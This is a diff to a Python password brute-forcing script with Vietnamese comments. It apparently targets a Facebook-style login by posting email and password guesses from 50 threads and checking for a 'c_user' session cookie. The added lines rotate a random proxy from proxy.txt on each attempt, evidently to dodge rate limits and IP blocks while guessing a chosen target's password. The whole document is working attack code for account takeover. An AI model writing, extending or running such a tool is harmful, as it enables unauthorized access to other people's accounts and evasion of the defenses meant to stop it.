@@ -19,16 +19,27 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 }
 
+# Đọc danh sách proxy từ tệp proxy.txt
+def load_proxies():
+    try:
+        with open('proxy.txt', 'r') as file:
+            return [line.strip() for line in file.readlines()]
+    except FileNotFoundError:
+        print("Tệp proxy.txt không tìm thấy.")
+        return []
+
 # Hàm thực hiện đăng nhập
-def login(target, password):
+def login(target, password, proxy=None):
     data = {
         'email': target,
         'pass': password,
         'login': 'Log In'
     }
     
+    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+    
     try:
-        response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
+        response = requests.post(login_url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
         
         if 'c_user' in response.cookies:
             return 1  # Đăng nhập thành công
@@ -48,13 +59,14 @@ def password_generator():
         length += 1
 
 # Hàm xử lý đa luồng
-def worker(target):
+def worker(target, proxies):
     while True:
         password = password_queue.get()
         if password is None:
             break
-        print(f"Đang thử mật khẩu: {password}")
-        result = login(target, password)
+        proxy = random.choice(proxies)  # Chọn proxy ngẫu nhiên
+        print(f"Đang thử mật khẩu: {password} với proxy: {proxy}")
+        result = login(target, password, proxy)
         if result == 1:
             result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
             break
@@ -65,12 +77,18 @@ def worker(target):
 
 # Hàm chính để khởi chạy các luồng
 def main(target):
+    proxies = load_proxies()  # Đọc proxy từ tệp
+
+    if not proxies:
+        print("Không có proxy khả dụng.")
+        return
+
     num_threads = 50  # Số luồng để thử nghiệm
 
     # Tạo luồng thử mật khẩu
     threads = []
     for _ in range(num_threads):
-        t = threading.Thread(target=worker, args=(target,))
+        t = threading.Thread(target=worker, args=(target, proxies))
         t.daemon = True
         t.start()
         threads.append(t)
